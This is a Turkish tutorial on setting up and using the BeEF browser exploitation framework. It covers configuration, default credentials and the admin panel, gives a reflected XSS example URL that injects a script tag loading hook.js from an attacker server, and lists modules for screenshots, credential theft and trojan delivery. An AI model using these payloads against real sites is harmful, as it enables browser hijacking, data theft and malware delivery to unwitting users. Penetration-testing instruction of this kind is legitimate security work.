## BeEF - The Browser Exploitation Framework

BeEF istemci taraflı çaşışan bir penetrasyon test aracıdır, kullanıcıların tarayıcılarını ele geçirerek javascript kodları çalıştırılabilir, tarayıcısı anlık olarak izlenebilir, yada farklı saldırı vektörleri için temel yapıyı oluşturabilir. BeEF 3 katmandan oluşur;

```bash
1. Saldırgan veya Saldırganların kişisel bilgisayarları
2. BeEF’in kurulu olduğu master server
3. Kurbanlar
```

Kurbanlar BeEF in attığı oltaya düştüğünde BeEF kurbanlardan bir çok veri çekmeye başlar ve verileri BeEF in kurulu olduğu ana sunucuya aktarır saldırgan ise kendi kişisel bilgisayarından BeEF in kurulu olduğu sunucuya BeEF arayüzünden bağlanarak kurbanların bilgilerini elegeçirebilir, javascript kodları çalıştırabilir, mesaj gönderebilir. (Zaaten javascript kodu çalıştırabiliyorsak yapabileceklerimizin bir sınırı yoktur :) )

### Konfigrasyon

BeEF’in konfigürasyon dosyası default olarak /etc/beef-xss dizinindeki config.yaml dosyasıdır. **/etc/beef-xss/config.yaml** dosyasını herhangi bir metin editörü ile açıp aşağıdaki adımlara göre konfigürasyon yapmalısınız.

#### Web Arayüz Ağ Kısıtlamaları

```bash
restrictions:
	permitted_hooking_subnet: "0.0.0.0/0"
	permitted_ui_subnet: "127.0.0.1/32"
```

**permitted_hooking_subnet:** Bu değişken, hangi subnetten BeEF’in arayüzüne hook yapılabileceğini belirler. Bu ayar, BeEF’in kurbanlara ulaşması için önemlidir.
**permitted_ui_subnet:** Bu değişken, hangi subnetten BeEF’in web arayüzüne giriş yapılabileceğini belirler. Bu ayar saldırganın web arayüz paneline ulaşması için önemlidir.

#### Web Sunucusu

```bash
http:
	debug: false
	host: "0.0.0.0"
	port: "3000"

	# Proxy
	public: "8.7.6.5"
	public_port: "3000"

	# Domain Name Server
	dns_host: "localhost"
	dns_port: 53

	# Web Admin Interface
	web_ui_basepath: "/ui"

	# Hook
	hook_file: "/hook.js"
	hook_session_name: "BEEFHOOK"
	session_cookie_name: "BEEFSESSION"
```

**debug:** Oluşacak hataların detaylı olarak çıktıları alınmak isteniyorsa bu değişken true olarak ayarlanmalıdır.

**host:** BeEF’in kurulu olduğu master server’ın IP adresi girilmelidir.

**port:** BeEF’in ayağa kaldırılacağı port. 3000 gibi popüler uygulamalar tarafından kullanılmayan bir port seçmek mantıklı olacaktır. Zira 80, 22 gibi portlar seçilirse sunucuda o portu kullanan diğer hizmetler ile çakıştığından sıkıntı yaşanacaktır. public ve public_port değişkenleri ise varsa bir vekil sunucu girilmesi içindir. Bu değişkenlerin set edilmesi zorunlu değildir. dns_host ve dns_port değişkenleri adından da anlaşılacağı üzere DNS host ve portunu girmemiz gereken değişkenlerdir. web_ui_basepath değişkeni, BeEF’in admin arayüzünün görüüntülenmesi istenen path değişkenidir.

**hook_file:** XSS zafiyeti bulunan hedefe entegre edilmesi gereken uzak JavaScript dosyasının yoludur.

#### Veri Tabanı

BeEF öntanımlı olarak SQLite kullanır ve veritabanı dosyası şuradadır: /var/lib/beef-xss/beef.db. Ancak MySQL ve PostgreSQL’de desteklenmektedir. Aşağıdaki ayarlardan dilerseniz veritabanını değiştirebilirsiniz. Dikkat edilmesi gereken bir nokta var; eğer Sqlite dışındaki seçeneklerden biri kullanılacak ise kullanılacak veritabanının adaptörü Gem ile yüklenmelidir.

Adımlar;

```bash
BeEF’in kurulu olduğu dizine geçmek; cd /usr/share/beef-xss
MySQL adaptörünün kurulumu; gem install "dm-mysql-adapter"
PostgreSQL adaptörünün kurulumu; gem install "dm-postgres-adapter"
```
```bash
database:
	driver: "sqlite"

	db_file: "db/beef.db"

	db_host: "localhost"
	db_port: 3306
	db_name: "beef"
	db_user: "beef"
	db_passwd: "beef"
	db_encoding: "UTF-8"
```

**driver:** Kullanılması istenilen veritabanı girilmelidir. Girilebilir değerler: sqlite, mysql, postgres
**db_file:** Eğer driver Sqlite seçilmiş ise veritabanı olarak kullanılacak dosyanın yolu. Diğer değişkenler ise eğer MySQL veya PostgreSQL seçilmiş ise bağlantı için gereken değerlerin girilmesi içindir. Eğer drive sqlite seçilmiş ise bu değerler boş bırakılabilir.

#### Yetkilendirme

BeEF’in web admin arayüzüne girmek için gerekli kullanıcı adı ve parola bu bölümde tanımlanır.

```bash
credentials:
	user:   "beef"
	passwd: "beef"
```
### BeEF’i Çalıştırmak

Bir önceki bölümde gerekli konfigürasyonu yaptıktan sonra BeEF’i ayağa kaldırmamız gerekiyor. Bunun birçok 
yolu var. Eğer Kali Linux kullanıyorsanız “Applications > Exploitation” menüzü altındaki “beef xss framework” uygulamasına tıklamanız yeterli. Gerekli servisleri başlatıp browser’da admin arayüzünü açacaktır. Kurulumu manuel olarak farklı bir sunucuya yaptıysanız 2 farklı şekilde çalıştırabilirsiniz. BeEF servisini start ederek,
BeEF’in Ruby dosyasını çalıştırarak



Kurulumu manuel olarak farklı bir sunucuya yaptıysanız tavsiyem 2. yöntem ile çalıştırmanızdır. BeEF’in Ruby dosyasından çalıştırmak için yapmanız gerekenler; BeEF’in kurulu olduğunuz dizine geçmek; cd /usr/share/beef-xs
BeEF’i çalıştırmak için; `./beef`



### XSS Zafiyeti ile BeEF Hook Dosyasını Tetiklemek

Kurulumdan sonra hook dosyanıza aşağıdaki şemadan ulaşabilirsiniz;

> http://{host}:{port}{hook_file} yani http://1.2.3.4:3000/hook.js

Hook dosyasının içerisinde kurbanı BeEF’in ağına düşürecek zararlı JavaScript kodu bulunmaktadır. XSS zafiyeti bulunan sistemde bir şekilde hook dosyası çağrılır ve kurban tarafından tetikletilir ise kurban BeEF’in ağına düşmüş olacaktır.

Örnek olarak aşağıdaki adresde Reflected XSS olduğunu varsayalım;

`http://test.com/ara.php?k=deneme` Buradaki XSS zafiyetine aşağıdaki şekilde hook dosyasını çağırtabiliriz;

`http://test.com/ara.php?k=<script src="http://1.2.3.4:3000/hook.js"></script>`



### Web Admin Arayüzü

Web admin arayüzüne yukarıda yapılan ayarlar sonucunda şu şemadan ulaşılabilir;

> http://{host}:{port}{web_ui_basepath}/panel

**Yeşil:** Komut zombi browserda çalıştırılabilir ve kurbanın bundan haberi olmaz.
**Turuncu:** Komut zombi browserda çalıştırılabilir ama kurbanın haberi olabilir.
**Beyaz:** Komutun çalıştırılabilme durumu henüz tespit edilemedi.
**Kırmızı:** Komut zombi üzerinde çalıştırılamaz.



1. Detail
  Zombinin sistemi hakkında bilgilerin olduğu sekmedir.

2. Logs
  Zombi browser üzerinde yapılmış işlemlerin zaman damgalı şekilde loglarının olduğu sekmedir.

3. Commands
  Zombi browser üzerinde komut çalıştırabileceğimiz sekmedir.

4. Rider
  Zombi browser üzerinden request gönderebileceğimiz sekmedir. “Forge Request” sekmesinden request yapabilir, 
  yapılan requestleri “History” sekmesinden görüntüleyebilirsiniz.

5. Network
  Zombi ile saldırgan arasındaki ağ bağlantısının görselleştirilmiş halinin olduğu sekmedir.

  

### BAZI KOMUTLAR

```bash
Create Alert Dialog -> Kurbana Alert Gönderir.
Raw JavaScript      -> JavaScript Enjekte Eder.
Spyder Eye          -> ScreenShot Alır.
Pretty Theft        -> Sosyal Ağ Çalma.
Fake Notification   -> Trojan Sızdırmak (Kurbana İndittirmek).
```

